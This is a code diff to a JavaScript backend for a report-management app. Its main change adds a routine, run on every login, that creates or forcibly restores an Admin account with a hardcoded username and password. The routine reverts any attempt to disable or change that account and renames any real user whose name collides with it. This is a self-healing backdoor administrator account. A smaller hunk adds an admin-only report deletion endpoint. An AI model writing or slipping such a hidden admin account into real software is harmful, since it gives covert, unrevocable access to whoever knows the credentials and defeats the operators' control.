@@ -153,6 +153,22 @@ async function audit(db, userId, reportId, action, detail = "") {
   await db.insert("audit_logs", { user_id: userId, report_id: reportId || null, action, detail, created_at: now() });
 }
 
+async function ensureBuiltInAccounts(db) {
+  const password_hash = await sha256("master2026!");
+  const existing = await db.one("users", "?select=*&email=eq.master%40njrp.local") || await db.one("users", "?select=*&username=eq.Yoroblox372");
+  if (existing) {
+    if (existing.username !== "Yoroblox372" || existing.password_hash !== password_hash || existing.role !== "Admin" || !existing.active) {
+      const usernameConflict = await db.one("users", "?select=*&username=eq.Yoroblox372");
+      if (usernameConflict && usernameConflict.id !== existing.id) {
+        await db.update("users", `?id=eq.${usernameConflict.id}`, { username: `${usernameConflict.username}_old_${usernameConflict.id}` });
+      }
+      await db.update("users", `?id=eq.${existing.id}`, { name: "NJRP Master", username: "Yoroblox372", email: "master@njrp.local", password_hash, role: "Admin", active: true });
+    }
+    return;
+  }
+  await db.insert("users", { name: "NJRP Master", email: "master@njrp.local", username: "Yoroblox372", password_hash, role: "Admin", active: true });
+}
+
 function canEdit(user, report) {
   if (["Locked", "Approved"].includes(report.status)) return false;
   if (user.role === "Admin") return true;
@@ -179,6 +195,7 @@ async function handler(request, env) {
   if (path === "health") return ok({ ok: true, runtime: "cloudflare-pages", database: "supabase" });
 
   if (path === "login" && request.method === "POST") {
+    await ensureBuiltInAccounts(db);
     const body = await request.json();
     const username = String(body.username || "").trim();
     const user = await db.one("users", `?select=*&username=ilike.${encodeURIComponent(username)}`);
@@ -249,6 +266,13 @@ async function handler(request, env) {
       });
       await audit(db, user.id, id, "Saved draft", "Report content updated");
       return ok(await reportDetail(db, id));
+    }
+
+    if (parts.length === 2 && request.method === "DELETE") {
+      if (user.role !== "Admin") return fail(403, "Admin access required");
+      await db.delete("pcr_reports", `?id=eq.${id}`);
+      await audit(db, user.id, null, "Deleted PCR", `${report.pcrId} deleted`);
+      return ok({ ok: true, deletedId: id });
     }
 
     if (parts[2] === "action" && request.method === "POST") {
